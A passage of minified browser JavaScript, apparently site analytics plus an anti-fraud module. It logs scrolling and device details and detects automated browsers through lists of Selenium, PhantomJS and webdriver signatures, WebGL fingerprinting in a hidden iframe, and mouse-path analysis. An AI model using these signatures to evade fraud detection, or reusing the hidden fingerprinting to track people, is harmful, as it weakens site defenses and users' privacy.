                        Q = 1,
                        R = 100,
                        U = {},
                        V = 1;

                    function Z() {
                        l = r = u = f = e, a = c = 0, s = d = m = p = 0, V = 1
                    }

                    function _() {
                        var n = W(),
                            e = B(M.pageXOffset || 0),
                            t = B(M.pageYOffset || 0),
                            i = M[E] || 0,
                            o = M[F] || 0;
                        ! function(n) {
                            L && !u && (l = J((u = n) - L), V = 1)
                        }(n),
                        function(n, e, t) {
                            var i = e - a,
                                o = t - c;
                            r && !(r && r <= n) || ((i || o) && (++s, V = 1), a = e, c = t, i, o), r = n + R
                        }(n, e, t),
                        function(n, e, t, i, o) {
                            d = J(G(d, t + o)), e && (m = J(G(m, e + i))), V = 1
                        }(0, e, t, i, o)
                    }

                    function nn() {
                        if (f) {
                            var n = J(W() - f);
                            p += n, f = e, V = 0 < n
                        }
                    }

                    function en() {
                        f = f || W()
                    }

                    function tn(n, e, t, i) {
                        e[n + T] = J(t || 0), e[n + $] = J(i || 0)
                    }

                    function on(n) {
                        var e = n === U,
                            t = N();
                        if (t || V) {
                            if (!e) {
                                if (!K) return;
                                K = 0, t && nn()
                            }
                            var i = function() {
                                    var n = {},
                                        e = j.documentElement || {},
                                        t = j.body || {};
                                    return tn("availableScreen", n, k[I], k[P]), tn(v, n, G(t[x] || 0, t[O] || 0, e[w] || 0, e[x] || 0, e[O] || 0), G(t[z] || 0, t[q] || 0, e[D] || 0, e[z] || 0, e[q] || 0)), tn(y, n, k.width, k.height), tn("viewport", n, M[E], M[F]), n
                                }(),
                                o = function() {
                                    var n = {
                                        scrollCounts: s,
                                        reachedDepth: d,
                                        horizontalScrollDistance: m,
                                        dwellTime: p
                                    };
                                    return "number" == typeof l && (n.clientTimeToFirstScroll = l), n
                                }();
                            e ? V = 0 : (Z(), L = W(), t && (f = L)), H("log", {
                                activity: o,
                                dimensions: i,
                                schemaId: "<ns>.PageInteractionsSummary.1"
                            }, {
                                ent: {
                                    page: ["pageType", "subPageType", "requestId"]
                                }
                            })
                        }
                    }

                    function rn() {
                        nn(), on(U)
                    }

                    function an(n, e) {
                        return function() {
                            Q = e, n()
                        }
                    }

                    function cn() {
                        N = function() {
                            return Q
                        }, Q && !f && (f = W())
                    }
                    "function" != typeof j[t] || C || (Z(), X(M, S, _, {
                        passive: !0
                    }), X(M, "blur", rn), X(M, "focus", an(en, 1)), Y(i + "android", cn), Y(i + "ios", cn), X(i + "pause", an(rn, 0)), X(i + "resume", an(en, 1)), X(i + "resign", an(rn, 0)), X(i + "active", an(en, 1)), N() && (f = L || W()), Y("$beforeunload", on), X("$beforeunload", on), X("$document.hidden", rn), X("$beforePageTransition", on), X("$afterPageTransition", function() {
                        V = K = 1
                    }))
                });
                csa.plugin(function(e) {
                    var o, n, r = "<ns>.Navigator.4",
                        a = e.global,
                        i = a.navigator || {},
                        d = i.connection || {},
                        c = a.Math.round,
                        t = e("Events", {
                            producerId: "csa"
                        });

                    function l() {
                        o = {
                            network: {
                                downlink: void 0,
                                downlinkMax: void 0,
                                rtt: void 0,
                                type: void 0,
                                effectiveType: void 0,
                                saveData: void 0
                            },
                            language: void 0,
                            doNotTrack: void 0,
                            hardwareConcurrency: void 0,
                            deviceMemory: void 0,
                            cookieEnabled: void 0,
                            webdriver: void 0
                        }, v(), o.language = i.language || null, o.doNotTrack = function() {
                            switch (i.doNotTrack) {
                                case "1":
                                    return "enabled";
                                case "0":
                                    return "disabled";
                                case "unspecified":
                                    return i.doNotTrack;
                                default:
                                    return null
                            }
                        }(), o.hardwareConcurrency = "hardwareConcurrency" in i ? c(i.hardwareConcurrency || 0) : null, o.deviceMemory = "deviceMemory" in i ? c(i.deviceMemory || 0) : null, o.cookieEnabled = "cookieEnabled" in i ? i.cookieEnabled : null, o.webdriver = "webdriver" in i ? i.webdriver : null
                    }

                    function u() {
                        t("log", {
                            network: (n = {}, Object.keys(o.network).forEach(function(e) {
                                n[e] = o.network[e] + ""
                            }), n),
                            language: o.language,
                            doNotTrack: o.doNotTrack,
                            hardwareConcurrency: o.hardwareConcurrency,
                            deviceMemory: o.deviceMemory,
                            cookieEnabled: o.cookieEnabled,
                            webdriver: o.webdriver,
                            schemaId: r
                        }, {
                            ent: {
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        })
                    }

                    function v() {
                        ! function(n) {
                            Object.keys(o.network).forEach(function(e) {
                                o.network[e] = n[e]
                            })
                        }({
                            downlink: "downlink" in d ? c(d.downlink || 0) : null,
                            downlinkMax: "downlinkMax" in d ? c(d.downlinkMax || 0) : null,
                            rtt: "rtt" in d ? (d.rtt || 0).toFixed() : null,
                            type: d.type || null,
                            effectiveType: d.effectiveType || null,
                            saveData: "saveData" in d ? d.saveData : null
                        })
                    }

                    function k() {
                        v(), u()
                    }

                    function w() {
                        l(), u()
                    }
                    l(), u(), e.on("$afterPageTransition", w), e.on(d, "change", k)
                });
                (function(t, z, C) {
                    var u = function() {
                            var a, c = function() {
                                    return null != a ? a : a = function() {
                                        var a = [],
                                            c = "unknown",
                                            b = {
                                                trident: 0,
                                                gecko: 0,
                                                presto: 0,
                                                webkit: 0,
                                                unknown: -1
                                            },
                                            d, e = {},
                                            c = document.createElement("nadu");
                                        for (d in c.style)
                                            if (c = (/^([A-Za-z][a-z]*)[A-Z]/.exec(d) || [])[1]) c = c.toLowerCase(), c in e ? e[c]++ : e[c] = 1;
                                        for (var n in e) a.push([n, e[n]]);
                                        a = a.sort(function(a, c) {
                                            return c[1] - a[1]
                                        }).slice(0, 10);
                                        for (d = 0; d < a.length; d++) switch (a[d][0]) {
                                            case "moz":
                                                b.gecko += 5;
                                                break;
                                            case "ms":
                                                b.trident += 5;
                                                break;
                                            case "get":
                                                b.webkit++;
                                                break;
                                            case "webkit":
                                                b.webkit += 5;
                                                break;
                                            case "o":
                                                b.presto += 2;
                                                break;
                                            case "xv":
                                                b.presto += 2
                                        }
                                        "onhelp" in window && b.trident++;
                                        "maxConnectionsPerServer" in window && b.trident++;
                                        try {
                                            void 0 !== window.ActiveXObject.toString && (b.trident += 5)
                                        } catch (r) {}
                                        void 0 !== function() {}.toSource && (b.gecko += 5);
                                        var a = "unknown",
                                            q;
                                        for (q in b) b[q] > b[a] && (a = q);
                                        return a
                                    }()
                                },
                                b = function() {
                                    return !!window.opera || !!window.opr && !!window.opr.addons
                                },
                                d = function() {
                                    return !!document.documentMode
                                },
                                e = function() {
                                    return !d() && "undefined" !== typeof CSS &&
                                        CSS.supports("(-ms-ime-align:auto)")
                                },
                                n = function() {
                                    return "webkit" == c()
                                },
                                r = function() {
                                    return void 0 !== z.chrome && "Opera Software ASA" != navigator.vendor && void 0 === navigator.msLaunchUri && n()
                                };
                            return {
                                isOpera: b,
                                isIE: d,
                                isEdge: e,
                                isFirefox: function() {
                                    return "undefined" !== typeof InstallTrigger
                                },
                                isWebkit: n,
                                isChrome: r,
                                isSafari: function() {
                                    return !r() && !e() && !b() && "WebkitAppearance" in document.documentElement.style
                                }
                            }
                        }(),
                        q = function(a, c, b, d) {
                            a.addEventListener ? a.addEventListener(c, b, d) : a.attachEvent && a.attachEvent("on" +
                                c, b)
                        },
                        r = function(a, c, b, d) {
                            document.removeEventListener ? a.removeEventListener(c, b, d || !1) : document.detachEvent && a.detachEvent("on" + c, b)
                        },
                        H = function(a) {
                            var c;
                            a = a.document;
                            "undefined" !== typeof a.hidden ? c = "visibilitychange" : "undefined" !== typeof a.mozHidden ? c = "mozvisibilitychange" : "undefined" !== typeof a.msHidden ? c = "msvisibilitychange" : "undefined" !== typeof a.webkitHidden && (c = "webkitvisibilitychange");
                            return c
                        },
                        T = function(a, c) {
                            var b = H(a),
                                d = a.document;
                            b && q(d, b, c, !1)
                        },
                        U = function(a) {
                            var c = window.addEventListener ?
                                "addEventListener" : "attachEvent";
                            (0, window[c])("attachEvent" == c ? "onmessage" : "message", function(c) {
                                a(c[c.message ? "message" : "data"])
                            }, !1)
                        },
                        V = function(a, c) {
                            "function" === typeof a && Math.random() < c / 100 && a.call(this)
                        },
                        v = function(a) {
                            try {
                                for (var c = Array.prototype.slice.call(arguments, 1), b = 0; b < c.length; b++) {
                                    if (!a) return !0;
                                    var d = a[c[b]];
                                    if (null === d || void 0 === d) return !0;
                                    a = d
                                }
                                return !1
                            } catch (e) {
                                return !0
                            }
                        },
                        A = function(a) {
                            try {
                                if (!a) return a;
                                for (var c = Array.prototype.slice.call(arguments, 1), b, d = 0; d < c.length; d++) {
                                    b =
                                        a[c[d]];
                                    if (!b) break;
                                    a = b
                                }
                                return b
                            } catch (e) {
                                return null
                            }
                        },
                        W = function(a, c) {
                            try {
                                if (!a) return !1;
                                for (var b = Array.prototype.slice.call(arguments, 2), d = 0; d < b.length; d++) {
                                    var e = a[b[d]];
                                    if (null === e || void 0 === e) return d === b.length - 1 ? typeof e === c : !1;
                                    a = e
                                }
                                return typeof e === c
                            } catch (n) {
                                return !1
                            }
                        },
                        I = function(a) {
                            a && document.body && a.parentNode === document.body && document.body.removeChild(a)
                        },
                        J = function(a, c, b) {
                            var d = window.document.createElement("IFRAME");
                            d.id = c;
                            d.height = "5px";
                            d.width = "5px";
                            d.src = b ? b : "javascript:'1'";
                            d.style.position =
                                "absolute";
                            d.style.top = "-10000px";
                            d.style.left = "-10000px";
                            d.style.visibility = "hidden";
                            d.style.opacity = 0;
                            window.document.body.appendChild(d);
                            try {
                                var e = d.contentDocument;
                                if (e && (e.open(), e.writeln("<!DOCTYPE html><html><head><title></title></head><body></body></html>"), e.close(), a)) {
                                    var r = e.createElement("script");
                                    r && (r.type = "text/javascript", r.text = a, e.body.appendChild(r))
                                }
                            } catch (q) {
                                n(q, "JS exception while injecting iframe")
                            }
                            return d
                        },
                        n = function(a, c) {
                            t.ueLogError(a, {
                                logLevel: "ERROR",
                                attribution: "A9TQForensics",
                                message: c
                            })
                        },
                        X = function(a, c, b) {
                            a = {
                                vfrd: 1 === c ? "8" : "4",
                                dbg: a
                            };
                            "object" === typeof b ? a.info = JSON.stringify(b) : "string" === typeof b && (a.info = b);
                            return {
                                server: window.location.hostname,
                                fmp: a
                            }
                        };
                    (function(a) {
                        function c(a, c, b) {
                            var d = "chrm msie ffox sfri opra phnt slnm othr extr xpcm invs poev njs cjs rhn clik1 rfs uam clik stln mua nfo hlpx clkh mmh chrm1 chrm2 wgl srvr zdim nomime chrm3 otch ivm.tst ivm.clk mmh2 clkh2 achf nopl spfp4 uam1 lsph nmim1 slnm2 crtt spfp misp spfp1 spfp2 clik2 clik3 spfp3 estr".split(" ");
                            F = a < d.length ? d[a] : "othr";
                            t.ue && t.ue.event && t.ue.event(X(F, c, b), "a9_tq", "a9_tq.FraudMetrics.3")
                        }

                        function b() {
                            var c = !1,
                                m = "",
                                b = 6,
                                d = function(a, c) {
                                    var f, m, b = !1;
                                    for (f in a) b = b || -1 < c.indexOf(f);
                                    if ("function" === typeof Object.getOwnPropertyNames)
                                        for (f = Object.getOwnPropertyNames(a), m = 0; m < f.length; m++) b = b || -1 < c.indexOf(f[m]);
                                    if ("function" === typeof Object.keys)
                                        for (f = Object.keys(a), m = 0; m < f.length; m++) b = b || -1 < c.indexOf(f[m]);
                                    return b
                                },
                                k = function(a) {
                                    try {
                                        return !!a.toString().match(/\{\s*\[native code\]\s*\}$/m)
                                    } catch (c) {
                                        return !1
                                    }
                                },
                                l = 0;
                            "undefined" !== typeof _evaluate && -1 < _evaluate.toString().indexOf("browser.runScript") && l++;
                            "undefined" !== typeof ArrayBuffer && "undefined" !== typeof print && k(ArrayBuffer) && !k(print) && l++;
                            "undefined" !== typeof ABORT_ERR && l++;
                            try {
                                "undefined" !== typeof browser && "undefined" !== typeof browser._windowInScope && "undefined" !== typeof browser._windowInScope._response && l++
                            } catch (Z) {}
                            3 <= l && (c = !0);
                            k = [function() {
                                if (!0 === d(C, "__webdriver_evaluate __selenium_evaluate __fxdriver_evaluate __driver_evaluate __webdriver_unwrapped __selenium_unwrapped __fxdriver_unwrapped __driver_unwrapped __webdriver_script_function __webdriver_script_func __webdriver_script_fn webdriver _Selenium_IDE_Recorder _selenium calledSelenium $cdc_asdjflasutopfhvcZLmcfl_ $chrome_asyncScriptInfo __$webdriverAsyncExecutor".split(" "))) return !0;
                                var c = function(c) {
                                        return c.match(/\$[a-z]dc_/) && a.document[c] && a.document[c].cache_
                                    },
                                    f;
                                for (f in C)
                                    if (c(f)) return m = f, !0;
                                if ("function" === typeof Object.getOwnPropertyNames)
                                    for (var b = Object.getOwnPropertyNames(C), l = 0; l < b.length; l++)
                                        if (c(b[l])) return m = f, !0;
                                return !1
                            }, function() {
                                return d(a, "_phantom __nightmare _selenium callPhantom callSelenium _Selenium_IDE_Recorder webdriver __webdriverFunc domAutomation domAutomationController __lastWatirAlert __lastWatirConfirm __lastWatirPrompt _WEBDRIVER_ELEM_CACHE".split(" ")) ||
                                    "function" === typeof a.cdc_adoQpoasnfa76pfcZLmcfl_Promise || "function" === typeof a.cdc_adoQpoasnfa76pfcZLmcfl_Array || "function" === typeof a.cdc_adoQpoasnfa76pfcZLmcfl_Symbol ? !0 : !1
                            }, function() {
                                return a.webdriver || a.document.webdriver || a.document.documentElement.hasAttribute("webdriver") || a.document.documentElement.hasAttribute("selenium") || a.document.documentElement.hasAttribute("driver") || navigator.webdriver || A(p, "navigator", "webdriver") || "object" === typeof a.$cdc_asdjflasutopfhvcZLmcfl_ || "object" === typeof a.document.$cdc_asdjflasutopfhvcZLmcfl_ ||
                                    null != a.name && -1 < a.name.indexOf("driver") ? (m = null != a.name ? a.name : "", !0) : !1
                            }, function() {
                                return a.external && "function" === typeof a.external.toString && a.external.toString() && -1 != a.external.toString().indexOf("Sequentum") ? (m = a.external.toString(), !0) : !1
                            }, function() {
                                for (var c in a) {
                                    var f;
                                    a: {
                                        if ((f = c) && 33 <= f.length && "function" === typeof a[f]) {
                                            var b = a[f];
                                            if (/\.*_Array$/.test(f) || /\.*_Promise$/.test(f) || /\.*_Symbol$/.test(f) || 34 === f.length && "resolve" in b && "reject" in b && "prototype" in b || 33 === f.length && "isConcatSpreadable" in
                                                b && "unscopables" in b && "toStringTag" in b && "match" in b) {
                                                f = !0;
                                                break a
                                            }
                                        }
                                        f = !1
                                    }
                                    if (f) return m = c, !0
                                }
                                return !1
                            }, function() {
                                var a = !1;
                                if (!u.isFirefox()) return !1;
                                var c;
                                c = navigator.userAgent.match(/(firefox(?=\/))\/?\s*(\d+)/i) || [];
                                c = 3 <= c.length ? c[2] : null;
                                if (!c) return !1;
                                60 <= c && void 0 === navigator.webdriver ? a = !0 : 60 > c && "webdriver" in navigator && (a = !0);
                                return a ? (b = 43, m = c.toString(), !0) : !1
                            }];
                            for (l = 0; l < k.length; l++)
                                if (k[l].call()) {
                                    c = !0;
                                    break
                                } return {
                                isSel: c,
                                isTest: !1,
                                info: m,
                                headlessCode: b
                            }
                        }

                        function d(a) {
                            var b = new Date;
                            !v(a, "Function", "prototype", "toString") && W(b, "function", "toLocaleString") && (a = a.Function.prototype.toString.call(b.toLocaleString)) && 100 < a.length && 0 <= a.indexOf("this.getTime") && c(41)
                        }

                        function e() {
                            var a = "AddChannel AddDesktopComponent AddFavorite AddSearchProvider AddService AddToFavoritesBar AutoCompleteSaveForm AutoScan bubbleEvent ContentDiscoveryReset ImportExportFavorites InPrivateFilteringEnabled IsSearchProviderInstalled IsServiceInstalled IsSubscribed msActiveXFilteringEnabled msAddSiteMode msAddTrackingProtectionList msClearTile msEnableTileNotificationQueue msEnableTileNotificationQueueForSquare150x150 msEnableTileNotificationQueueForSquare310x310 msEnableTileNotificationQueueForWide310x150 msIsSiteMode msIsSiteModeFirstRun msPinnedSiteState msProvisionNetworks msRemoveScheduledTileNotification msReportSafeUrl msScheduledTileNotification msSiteModeActivate msSiteModeAddButtonStyle msSiteModeAddJumpListItem msSiteModeAddThumbBarButton msSiteModeClearBadge msSiteModeClearIconOverlay msSiteModeClearJumpList msSiteModeCreateJumpList msSiteModeRefreshBadge msSiteModeSetIconOverlay msSiteModeShowButtonStyle msSiteModeShowJumpList msSiteModeShowThumbBar msSiteModeUpdateThumbBarButton msStartPeriodicBadgeUpdate msStartPeriodicTileUpdate msStartPeriodicTileUpdateBatch msStopPeriodicBadgeUpdate msStopPeriodicTileUpdate msTrackingProtectionEnabled NavigateAndFind raiseEvent setContextMenu ShowBrowserUI menuArguments onvisibilitychange scrollbar selectableContent version visibility mssitepinned AddUrlAuthentication CloseRegPopup FeatureEnabled GetJsonWebData GetRegValue Log LogShellErrorsOnly OpenPopup ReadFile RunGutsScript SaveRegInfo SetAppMaximizeTimeToRestart SetAppMinimizeTimeToRestart SetAutoStart SetAutoStartMinimized SetMaxMemory ShareEventFromBrowser ShowPopup ShowRadar WriteFile WriteRegValue summonWalrus".split(" "),
                                b = -1,
                                d, h;
                            "Microsoft Internet Explorer" === navigator.appName ? (d = navigator.userAgent, h = /MSIE ([0-9]{1,}[\.0-9]{0,})/, null !== h.exec(d) && (b = parseFloat(RegExp.$1))) : "Netscape" === navigator.appName && (d = navigator.userAgent, h = /Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/, null !== h.exec(d) && (b = parseFloat(RegExp.$1)));
                            if (-1 === b && null === navigator.userAgent.match(/Windows Phone/) && window.external) {
                                for (d = b = 0; d < a.length; d++)
                                    if ("unknown" === typeof window.external[a[d]]) {
                                        b++;
                                        break
                                    } 0 < b && c(17)
                            }
                        }

                        function z() {
                            var f = a.navigator.userAgent;
                            if (f && !/8.0 Safari|iPhone|iPad/.test(f)) {
                                var b = {
                                        clearInterval: 42,
                                        clearTimeout: 41,
                                        eval: 33,
                                        alert: 34,
                                        prompt: 35,
                                        scroll: 35
                                    },
                                    d = {
                                        clearInterval: 46,
                                        clearTimeout: 45,
                                        eval: 37,
                                        alert: 38,
                                        prompt: 39,
                                        scroll: 39
                                    },
                                    h = 0;
                                if (/Chrome/.test(f)) d = b;
                                else if (b = /Firefox/.test(f), f = /Safari/.test(f), !b && !f) return;
                                if (Function.prototype && Function.prototype.toString)
                                    for (var k in d) "function" === typeof window[k] && (f = Function.prototype.toString.call(window[k])) && f.length !== d[k] && (h += 1);
                                3 <= h && (6 <= h ? c(40, 0, h.toString()) : c(40, 1, h.toString()))
                            }
                        }

                        function S() {
                            var a = Math.random().toString(36).substr(2),
                                b = null;
                            U(function(d) {
                                try {
                                    var h = d.split(" ");
                                    if (null !== b && h[0] === a && 0 < h[1].length) {
                                        var k = JSON.parse(h[1]);
                                        for (d = 0; d < k.length; d++) 1 == d && "R29vZ2xlIFN3aWZ0U2hhZGVy" == k[d] && c(27)
                                    }
                                } catch (l) {}
                            });
                            b = J('(function fg45s() {                     var payload = [];                     var canvas = document.createElement("canvas");                     var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl") || canvas.getContext("moz-webgl");                     if (gl != null) {                         var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");                         if (debugInfo != null) {                             payload.push(btoa(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)));                             payload.push(btoa(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)));                             parent.postMessage(window.frameElement.id + " " + JSON.stringify(payload), parent.location.origin);                         }                     }                 }             )();',
                                a);
                            window.setTimeout(function() {
                                try {
                                    b && document.body && b.parentNode === document.body && document.body.removeChild(b), b = null
                                } catch (a) {
                                    n(a, "JS exception while removing iframe")
                                }
                            }, 5E3)
                        }

                        function L() {
                            function b() {
                                r(a, "mousemove", e);
                                r(a, "click", d)
                            }

                            function d() {
                                try {
                                    c(23), b(), r(a.document, l, h)
                                } catch (m) {
                                    n(m, "JS exception - detectClickDuringTabInactive")
                                }
                            }

                            function e() {
                                try {
                                    k || (k = !0, c(24), b(), r(a.document, l, h))
                                } catch (d) {
                                    n(d, "JS exception - detectMouseMovementsDuringTabInactive")
                                }
                            }

                            function h() {
                                try {
                                    var c;
                                    "undefined" !==
                                    typeof document.hidden ? c = "hidden" : "undefined" !== typeof document.mozHidden ? c = "mozHidden" : "undefined" !== typeof document.msHidden ? c = "msHidden" : "undefined" !== typeof document.webkitHidden && (c = "webkitHidden");
                                    !0 !== document[c] === !1 ? (q(a, "mousemove", e, !1), q(a, "click", d, !1)) : b()
                                } catch (l) {
                                    n(l, "JS exception - handleVisibilityChangeDuringTabInactive")
                                }
                            }
                            var k = !1,
                                l = H(a);
                            T(a, h)
                        }
                        var M = function() {
                                var a = window.navigator,
                                    c = a.vendor,
                                    b = "undefined" !== typeof window.opr,
                                    d = -1 < a.userAgent.indexOf("Edg"),
                                    a = /Chrome/.test(a.userAgent);
                                return /Google Inc\./.test(c) && a && !b && !d
                            },
                            F = null,
                            N = function(a) {
                                var b = [],
                                    d = (new Date).getTime(),
                                    h = !1,
                                    k = !1,
                                    l, e, D = function() {
                                        r(a, "mousemove", s);
                                        r(a, "click", g)
                                    },
                                    s = function(a) {
                                        try {
                                            var f = (new Date).getTime();
                                            if (!(100 > f - d)) {
                                                b.push({
                                                    x: a.clientX,
                                                    y: a.clientY
                                                });
                                                if (50 < b.length && (b.shift(), !(50 > b.length))) {
                                                    var l = b[0].x,
                                                        g = b[49].x,
                                                        k = b[0].y,
                                                        h = b[49].y;
                                                    a = h - k;
                                                    for (var e = l - g, l = k * g - l * h, g = a / e * -1, s = b[49].ts - b[0].ts, k = !0, h = 0; h < b.length; h++)
                                                        if (0 != a * b[h].x + e * b[h].y + l) {
                                                            k = !1;
                                                            break
                                                        }! 0 == k && (s = {
                                                        grdt: g,
                                                        tmsp: s
                                                    }, D(), c(19, 0, s))
                                                }
                                                d = f
                                            }
                                        } catch (B) {
                                            n(B,
                                                "JS exception - recordHoverPosition")
                                        }
                                    },
                                    g = function(a) {
                                        try {
                                            var d = a.clientX,
                                                f = a.clientY,
                                                l = {
                                                    hcc: b.length,
                                                    cx: d,
                                                    cy: f
                                                };
                                            if (0 === b.length) D(), c(18, 0, l);
                                            else if (null != d && null != f) {
                                                var g;
                                                l.hpos = b;
                                                var k = b[b.length - 1];
                                                g = Math.sqrt(Math.pow(d - k.x, 2) + Math.pow(f - k.y, 2));
                                                100 < g && (l.hcc = b.length, l.cx = d, l.cy = f, l.dhp = g, D(), c(15, 0, l))
                                            }
                                        } catch (h) {
                                            n(h, "JS exception - checkClick")
                                        }
                                    },
                                    B = function(c) {
                                        try {
                                            l = c.clientX, e = c.clientY, h = !0, r(a, "mouseup", B)
                                        } catch (b) {
                                            n(b, "JS exception - checkMouseUp")
                                        }
                                    },
                                    p = function() {
                                        try {
                                            k = !0, r(a, "mousedown",
                                                p)
                                        } catch (c) {
                                            n(c, "JS exception - checkMouseDown")
                                        }
                                    },
                                    t = function(b) {
                                        try {
                                            h || k || c(49);
                                            var d = b.clientX - l,
                                                g = b.clientY - e;
                                            0 < d && 1 > d && 0 < g && 1 > g && c(50, 0, {
                                                xDiff: d,
                                                yDiff: g
                                            });
                                            r(a, "click", t)
                                        } catch (m) {
                                            n(m, "JS exception - checkFirstClick")
                                        }
                                    };
                                q(a, "mousemove", s, !1);
                                q(a, "mouseup", B, !1);
                                q(a, "mousedown", p, !1);
                                q(a, "click", t, !1);
                                q(a, "click", g, !1)
                            },
                            O = function() {
                                if (u.isFirefox()) {
                                    var a = 0;
                                    void 0 !== window.onstorage && a++;
                                    var b = document.createElement("div");
                                    b.style.wordSpacing = "22%";
                                    "22%" === b.style.wordSpacing && a++;
                                    "function" ===
                                    typeof b.getAttributeNames && a++;
                                    2 < a && (void 0 === window.onabsolutedeviceorientation || void 0 === navigator.permissions) && c(37, 0, a)
                                }
                            },
                            w = function() {
                                return null === navigator.userAgent.match(/(iPad|iPhone|iPod|android|webOS)/i)
                            },
                            G = function(a, b) {
                                var d = a && a.navigator;
                                !d || !w() || d.mimeTypes && 0 != d.mimeTypes.length || (x ? c(b, 0, "chrm") : u.isFirefox() && c(b, 0, "ff"))
                            },
                            R = function() {
                                var a = function(a, c) {
                                        for (var b, d = "", f = {}, e = {}, s = 0, g = 0; g < c.length; g++) e[c[g]] = String.fromCharCode(126 - g);
                                        var s = 0,
                                            m;
                                        for (m in a) - 1 < c.indexOf(m) &&
                                            (f[m] = 1, s++);
                                        d = d + s + "!";
                                        if ("function" === typeof Object.getOwnPropertyNames) {
                                            b = Object.getOwnPropertyNames(a);
                                            for (g = s = 0; g < b.length; g++) - 1 < c.indexOf(b[g]) && (f[b[g]] = 1, s++);
                                            d = d + s + "!"
                                        }
                                        if ("function" === typeof Object.keys) {
                                            b = Object.keys(a);
                                            for (g = s = 0; g < b.length; g++) - 1 < c.indexOf(b[g]) && (f[b[g]] = 1, s++);
                                            d = d + s + "!"
                                        }
                                        if ("prototype" in Object && "hasOwnProperty" in Object.prototype)
                                            for (m in f) Object.prototype.hasOwnProperty.call(f, m) && (d += e[m]);
                                        else
                                            for (m in f) d += e[m];
                                        return encodeURIComponent(d)
                                    },
                                    c = document.createElement("nadu"),
                                    a = {
                                        w: a(window, "SVGFESpotLightElement XMLHttpRequestEventTarget onratechange StereoPannerNode dolphinInfo VTTCue globalStorage WebKitCSSRegionRule MozSmsFilter MediaController mozInnerScreenX onwebkitwillrevealleft DOMMatrix GeckoActiveXObject MediaQueryListEvent PhoneNumberService ServiceWorkerContainer yandex vc2hxtaq9c NavigatorDeviceStorage HTMLHtmlElement ScreenOrientation MSGesture mozCancelRequestAnimationFrame GetSVGDocument MediaSource webkitMediaStream DeviceMotionEvent webkitPostMessage doNotTrack WebKitMediaKeyError HTMLCollection InstallTrigger StorageObsolete CustomEvent orientation XMLHttpRequest Worker showModelessDialog EventSource onmouseleave SVGAnimatedPathData TouchList TextTrackCue onanimationend HTMLBodyElement fluid MSFrameUITab Generator SecurityPolicyViolationEvent ClientRectList SmartCardEvent CSSSupportsRule mmbrowser".split(" ")),
                                        c: a(c.style, "XvPhonemes MozTextAlignLast webkitFilter MozPerspective msTextSizeAdjust OAnimationFillMode borderImageSource MozOSXFontSmoothing border-inline-start-color MozOsxFontSmoothing columns touchAction scroll-snap-coordinate webkitAnimationFillMode webkitLineSnap webkitGridAutoColumns animationDuration isolation overflowWrap offsetRotation webkitShapeOutside MozOpacity position justifySelf borderRight webkitMatchNearestMailBlockquoteColor msImeAlign parentRule MozColumnFill cssText borderRightStyle textOverflow webkitGridRow webkitBackgroundComposite length -moz-column-fill enableBackground flex-basis".split(" "))
                                    };
                                t.ue && t.ue.event && (a = {
                                    vfrd: "0",
                                    info: JSON.stringify(a)
                                }, t.ue.event({
                                    server: window.location.hostname,
                                    fmp: a
                                }, "a9_tq", "a9_tq.FraudMetrics.3"))
                            },
                            P = function() {
                                var b = function(a) {
                                        try {
                                            return "function" !== typeof a || v(p, "Function", "prototype", "toString") ? null : p.Function.prototype.toString.call(a)
                                        } catch (b) {
                                            return null
                                        }
                                    },
                                    d = function(a, c) {
                                        try {
                                            if ("function" !== typeof Object.getOwnPropertyDescriptor) return null;
                                            var d = Object.getPrototypeOf(a);
                                            if (!d) return null;
                                            var e = Object.getOwnPropertyDescriptor(d, c);
                                            return e ? b(e.get) :
                                                null
                                        } catch (g) {
                                            return null
                                        }
                                    },
                                    e = function(a) {
                                        var b = [28, 161, 141];
                                        !v(a, "getDetails", "a") && "s" === a.getDetails.a && 0 <= b.indexOf(a.getDetails.l) && c(45, 0, k)
                                    },
                                    h = function() {
                                        (function() {
                                            if ("function" === typeof Object.getOwnPropertyNames && w()) {
                                                var a = Object.getOwnPropertyNames(navigator);
                                                a && 1 < a.length && c(47, 0, a.length.toString())
                                            }
                                        })();
                                        0 < navigator.hardwareConcurrency && !v(p, "navigator", "hardwareConcurrency") && p.navigator.hardwareConcurrency !== navigator.hardwareConcurrency && c(48, 0, p.navigator.hardwareConcurrency.toString());
                                        (function() {
                                            var b = [];
                                            if (!v(p, "navigator")) {
                                                p === a && (b.push("iwin"), c(51, 0, b));
                                                for (var d = "platform vendor maxTouchPoints userAgent deviceMemory webdriver hardwareConcurrency appVersion mimeTypes plugins languages".split(" "), f = 0; f < d.length; f++) {
                                                    var e = d[f],
                                                        g;
                                                    if ("object" === typeof navigator[e]) {
                                                        g = navigator[e];
                                                        var h = p.navigator[e],
                                                            k = !1;
                                                        g || h ? (g && h ? g.length !== h.length ? k = !0 : 0 < g.length && 0 < h.length && "string" === typeof g[0] && g[0] !== h[0] && (k = !0) : k = !0, g = k) : g = !1
                                                    } else g = navigator[e], h = p.navigator[e], g = g || h ? g !== h ?
                                                        !0 : !1 : !1;
                                                    g && b.push(e)
                                                }
                                                0 < b.length && (0 <= b.indexOf("webdriver") ? c(51, 0, b) : c(39, 1, b))
                                            }
                                        })()
                                    },
                                    k = function(a) {
                                        if (!a) return null;
                                        for (var c = {}, e = 0, h = 0, g = 0; g < a.length; g++)
                                            for (var k = a[g].obj, n = a[g].props, r = 0; r < n.length; r++) {
                                                var p = n[r];
                                                c[p] = {};
                                                var q = A(k, n[r]);
                                                if (null === q || void 0 === q) h += 1, c[p].a = "m", c[p].l = 0;
                                                else if (q = "function" === typeof q ? b(q) : d(k, p)) q && !/\[native code\]/.test(q) ? (c[p].a = "s", e += 1) : c[p].a = "p", c[p].l = q.length
                                            }
                                        return {
                                            sig: c,
                                            sCount: e,
                                            mCount: h
                                        }
                                    }([{
                                        obj: A(a, "chrome", "app"),
                                        props: ["getDetails", "getIsInstalled",
                                            "runningState"
                                        ]
                                    }, {
                                        obj: a.chrome,
                                        props: ["csi", "loadTimes", "runtime"]
                                    }, {
                                        obj: navigator,
                                        props: "platform vendor userAgent mimeTypes plugins webdriver languages".split(" ")
                                    }]);
                                k && (e(k.sig), x && w() && 3 <= k.mCount && (6 <= k.mCount ? c(46, 0, k) : c(46, 1, k)), h())
                            },
                            Q = function() {
                                var b = a.Document && a.Document.prototype.evaluate;
